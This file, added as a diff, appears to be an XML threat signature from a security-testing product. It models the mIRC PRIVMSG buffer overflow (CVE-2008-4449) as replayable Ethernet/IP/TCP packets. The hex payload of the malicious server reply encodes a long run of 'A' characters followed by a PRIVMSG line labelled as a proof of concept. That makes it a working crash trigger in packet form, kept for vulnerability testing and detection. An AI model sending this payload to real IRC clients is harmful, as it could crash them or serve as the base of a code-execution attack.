@@ -1,0 +1,108 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="mIRC PRIVMSG Message Processing Buffer Overflow"/>
+    <EngDesc display="true" value="There exists a buffer overflow vulnerability in mIRC. The flaw is due to insufficient input validation when processing PRIVMSG IRC messages. A remote attacker may exploit this vulnerability by persuading the target user to connect to a malicious IRC server. Successful attack could allow for arbitrary code injection and execution with privileges of the currently logged on user."/>
+    <Intent display="true">
+      <item value="BUFFER_OVERFLOW"/>
+    </Intent>
+    <Protocol display="true" value="MIRC"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="mIRC"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="mIRC_mIRC_mIRC"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true"/>
+    <Credit display="true" value="FSC20081003-05"/>
+    <CVEID display="true" value="CVE-2008-4449"/>
+    <bugtraqID display="true" value="31552"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="59731866ccb811dd8816000c29da7492"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="Medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="Partial"/>
+    <IntegImpact display="false" value="Partial"/>
+    <AvailImpact display="false" value="Partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="633613969314218750"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1229572903" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="Q"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="R"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="S"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="T"/>
+    <NamedVar name="MIRCdestPort" type="ImperfectControls.Port" value="null" index="U"/>
+  </Variables>
+  <Loops>
+    <for index="C">
+      <for index="Q"/>
+      <for index="R"/>
+      <for index="S"/>
+      <for index="T"/>
+      <for index="U"/>
+    </for>
+    <for index="D"/>
+    <for index="E">
+      <for index="Q"/>
+      <for index="R"/>
+      <for index="S"/>
+      <for index="T"/>
+      <for index="U"/>
+    </for>
+    <for index="K"/>
+  </Loops>
+  <PostScript/>
+  <Output index="C" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0028" Identification="14CF" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="7C89" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="@random(1026,65535)" destPort="$MIRCdestPort" SeqNumber="896596A0" AckNumber="11AA4127" HeaderLength="05" WindowSize="FAF0" Checksum="BA1D" UrgentPointer="0000" Options="" Payload="" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="E" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0030" Identification="14D0" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="7C80" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="@random(1026,65535)" destPort="$MIRCdestPort" SeqNumber="896596A0" AckNumber="11AA4174" HeaderLength="05" WindowSize="FAA3" Checksum="A60D" UrgentPointer="0000" Options="" Payload="4E49434B2061620A5553455220622022622E636F6D2220226468637032313522203A610A55534552484F53542079757365720A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1,3">
+    <Output index="D" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0075" Identification="D08B" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="0080" srcIP="" destIP="" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="" destPort="" SeqNumber="11AA4127" AckNumber="896596A0" HeaderLength="05" WindowSize="16D0" Checksum="7287" UrgentPointer="0000" Options="" Payload="3A6173737572656E742E6972632E73657276657220303031207975736572203A57656C636F6D6520746F2074686520496E7465726E65742052656C6179204E6574776F726B2079757365720D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="K" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0215" Identification="D093" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="FED7" srcIP="" destIP="" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="" destPort="" SeqNumber="11AA4174" AckNumber="896596D3" HeaderLength="05" WindowSize="16D0" Checksum="CC5A" UrgentPointer="0000" Options="" Payload="3A4141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414120505249564D5347207975736572203A2050726F6F66206F6620436F6E636570742C20436F70797269676874204173737572656E742053656375726520546563686E6F6C6F676965732C20612054656C757320436F6D70616E790D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
